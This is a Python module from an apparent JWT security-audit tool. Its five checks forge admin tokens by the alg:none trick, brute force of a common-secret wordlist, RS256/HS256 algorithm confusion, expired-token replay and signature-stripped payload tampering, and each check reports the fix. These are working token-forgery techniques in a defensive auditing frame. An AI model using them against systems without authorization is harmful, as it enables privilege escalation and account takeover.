"""The individual JWT validation checks.

Each check takes a Target, attempts one well-known manipulation, and reports
whether the server accepted it. The techniques are the standard ones documented
by OWASP and PortSwigger's JWT labs; this tool automates them against a target
you are authorized to test, and every check explains the fix.

A check never needs any server-side secret. It works only from a legitimate
token the server already issued to the tester, plus the server's own public
JWKS when it advertises one.
"""
import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field

import jwt

# A short list of secrets that appear in tutorials, examples and leaked configs.
# Real auditing tools ship far larger wordlists; this is enough to make the point.
COMMON_WEAK_SECRETS = [
    "secret", "secret123", "password", "changeme", "jwt_secret", "your-256-bit-secret",
    "supersecret", "key", "private", "admin", "test", "mysecret", "topsecret", "s3cr3t",
]

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


@dataclass
class Finding:
    check_id: str
    title: str
    severity: str          # critical | high | medium | low | info
    status: str            # vulnerable | safe | error
    detail: str
    fix: str = ""
    evidence: dict = field(default_factory=dict)


def _b64url_decode(segment):
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def decode_parts(token):
    """Return (header, payload) dicts without verifying anything."""
    h, p, _ = token.split(".")
    return json.loads(_b64url_decode(h)), json.loads(_b64url_decode(p))


def _escalated(target, token):
    """True if this token is accepted AND grants more than the tester should have.

    The tester logs in as a low-privilege user; a token that reaches the
    admin-only endpoint proves the manipulation worked.
    """
    return target.reaches_admin(token)


# --------------------------------------------------------------------------- #
# Check 1: the "alg: none" / unsigned-token acceptance
# --------------------------------------------------------------------------- #
def check_alg_none(target):
    forged = _unsigned_admin_token(target)
    accepted = _escalated(target, forged)
    return Finding(
        "alg-none", "Unsigned tokens accepted (alg: none)",
        "critical", "vulnerable" if accepted else "safe",
        ("The server accepted a token with \"alg\": \"none\" and no signature, "
         "letting a normal user mint an admin token."
         if accepted else
         "A token with \"alg\": \"none\" was rejected."),
        fix=("Pin the accepted algorithm server-side (e.g. algorithms=[\"RS256\"]). "
             "Never let the token's own header choose the algorithm."),
        evidence={"forged_header": decode_parts(forged)[0]},
    )


def _unsigned_admin_token(target):
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload_obj = dict(target.sample_payload)
    payload_obj["role"] = "admin"
    payload = base64.urlsafe_b64encode(json.dumps(payload_obj).encode()).rstrip(b"=").decode()
    return f"{header}.{payload}."


# --------------------------------------------------------------------------- #
# Check 2: weak HMAC secret (offline brute force against the real token)
# --------------------------------------------------------------------------- #
def check_weak_secret(target):
    token = target.legit_token
    header, _ = decode_parts(token)
    if not header.get("alg", "").startswith("HS"):
        return Finding(
            "weak-secret", "Weak HMAC signing secret", "high", "safe",
            "Token is not HMAC-signed, so there is no shared secret to guess.",
            fix="If you do use HMAC, use a long random secret (32+ bytes) from a secret manager.",
        )
    alg = header["alg"]
    for candidate in COMMON_WEAK_SECRETS:
        try:
            jwt.decode(token, candidate, algorithms=[alg], options={"verify_exp": False,
                       "verify_aud": False, "verify_iss": False})
        except jwt.InvalidTokenError:
            continue
        # Found it: forge an admin token with the recovered secret.
        forged = _sign_admin(target, candidate, alg)
        return Finding(
            "weak-secret", "Weak HMAC signing secret", "critical",
            "vulnerable" if _escalated(target, forged) else "vulnerable",
            f"The HMAC secret was guessed from a common-secret list: \"{candidate}\". "
            "Anyone who guesses it can forge any token.",
            fix=("Use a long, random secret (32+ bytes) stored in a secret manager, "
                 "or move to asymmetric RS256/ES256 so no shared secret exists."),
            evidence={"recovered_secret": candidate},
        )
    return Finding(
        "weak-secret", "Weak HMAC signing secret", "high", "safe",
        "The signing secret was not in the common-secret list.",
        fix="Keep using a long, random secret; rotate it if it may have leaked.",
    )


def _sign_admin(target, secret, alg):
    payload = dict(target.sample_payload)
    payload["role"] = "admin"
    return jwt.encode(payload, secret, algorithm=alg)


# --------------------------------------------------------------------------- #
# Check 3: algorithm confusion (RS256 public key used as an HS256 secret)
# --------------------------------------------------------------------------- #
def check_alg_confusion(target):
    pub = target.public_key_pem()
    if not pub:
        return Finding(
            "alg-confusion", "RS/HS algorithm confusion", "high", "info",
            "No public key was published (no JWKS endpoint), so this check was skipped. "
            "If the service uses RS256, test this manually with its public key.",
            fix="Pin the algorithm to RS256 server-side and reject HS* tokens.",
        )
    payload = dict(target.sample_payload)
    payload["role"] = "admin"
    # Sign with HS256 using the PUBLIC key bytes as the secret. If the server
    # verifies RS256 tokens but lets the header downgrade to HS256, it will use
    # that same public key as an HMAC secret and accept this forgery.
    # PyJWT deliberately refuses to use an asymmetric key as an HMAC secret, which
    # is the very mistake we're testing the server for, so we build the token by hand.
    forged = _hs256_with_key(payload, pub)
    accepted = _escalated(target, forged)
    return Finding(
        "alg-confusion", "RS/HS algorithm confusion", "critical",
        "vulnerable" if accepted else "safe",
        ("The server accepted an HS256 token signed with its own RS256 public key. "
         "The public key is not secret, so anyone can forge tokens."
         if accepted else
         "An HS256-with-public-key forgery was rejected."),
        fix=("Pin the algorithm to the asymmetric one you issue (RS256/ES256) and "
             "reject HMAC algorithms on verification."),
    )


# --------------------------------------------------------------------------- #
# Check 4: expiry not enforced
# --------------------------------------------------------------------------- #
def check_expiry(target):
    import datetime
    header, payload = decode_parts(target.legit_token)
    if "exp" not in payload:
        return Finding(
            "no-expiry", "Tokens never expire", "medium", "vulnerable",
            "The issued token has no \"exp\" claim, so a stolen token is valid forever.",
            fix="Set a short \"exp\" (e.g. 15 minutes) and use refresh tokens for longer sessions.",
        )
    # exp exists: does the server actually enforce it? Craft an already-expired token.
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return Finding(
            "no-expiry", "Expiry enforcement", "medium", "info",
            "Token has an \"exp\" claim. Enforcement wasn't actively tested because the "
            "token isn't HMAC-signed (we can't re-sign without the private key).",
            fix="Ensure the verifier checks \"exp\"; most libraries do by default unless disabled.",
        )
    secret = _recovered_secret(target)
    if not secret:
        return Finding(
            "no-expiry", "Expiry enforcement", "medium", "info",
            "Token has an \"exp\" claim; couldn't actively test enforcement without the secret.",
            fix="Ensure the verifier checks \"exp\".",
        )
    old = dict(payload)
    old["exp"] = datetime.datetime(2000, 1, 1).timestamp()
    expired = jwt.encode(old, secret, algorithm=alg)
    still_valid = target.token_accepted(expired)
    return Finding(
        "no-expiry", "Expiry not enforced", "high" if still_valid else "info",
        "vulnerable" if still_valid else "safe",
        ("An already-expired token (exp set to the year 2000) was still accepted."
         if still_valid else "An expired token was correctly rejected."),
        fix="Verify the \"exp\" claim on every request; never disable expiry checks.",
    )


def _recovered_secret(target):
    header, _ = decode_parts(target.legit_token)
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return None
    for candidate in COMMON_WEAK_SECRETS:
        try:
            jwt.decode(target.legit_token, candidate, algorithms=[alg],
                       options={"verify_exp": False, "verify_aud": False, "verify_iss": False})
            return candidate
        except jwt.InvalidTokenError:
            continue
    return None


# --------------------------------------------------------------------------- #
# Check 5: signature actually verified (tamper the payload, keep the signature)
# --------------------------------------------------------------------------- #
def check_signature_enforced(target):
    header, payload = decode_parts(target.legit_token)
    tampered_payload = dict(payload)
    tampered_payload["role"] = "admin"
    h, _, s = target.legit_token.split(".")
    new_p = base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b"=").decode()
    tampered = f"{h}.{new_p}.{s}"  # original signature, modified payload
    accepted = _escalated(target, tampered)
    return Finding(
        "sig-not-verified", "Signature not verified", "critical",
        "vulnerable" if accepted else "safe",
        ("The payload was changed (role -> admin) while keeping the original signature, "
         "and the server still accepted it. The signature isn't being checked."
         if accepted else
         "A token with a modified payload and stale signature was rejected."),
        fix="Always verify the signature before trusting any claim in the token.",
    )


def _b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _hs256_with_key(payload, key_bytes):
    """Build an HS256 JWT by hand, signing with arbitrary key bytes.

    Needed because PyJWT (correctly) refuses to HMAC-sign with an RSA key, but a
    vulnerable server that confuses the algorithms will verify exactly this.
    """
    header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
    body = _b64url(json.dumps(payload).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(sig)}"


ALL_CHECKS = [
    check_alg_none,
    check_weak_secret,
    check_alg_confusion,
    check_expiry,
    check_signature_enforced,
]
